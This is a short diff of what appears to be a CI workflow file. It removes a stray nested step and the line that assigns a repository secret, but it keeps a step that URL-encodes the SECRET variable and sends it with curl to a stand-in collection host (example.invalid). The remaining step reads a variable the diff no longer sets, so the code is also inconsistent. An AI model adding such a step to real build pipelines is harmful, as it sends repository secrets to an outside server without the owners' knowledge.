@@ -11,7 +11,5 @@ jobs:
 
     steps:
       - run: |
-          - run: |
-          SECRET="${{ secrets.TEST_SECRET }}"
           ENCODED=$(python3 -c "import urllib.parse, os; print(urllib.parse.quote(os.environ['SECRET']))")
           curl --data "$ENCODED" https://example.invalid/collect
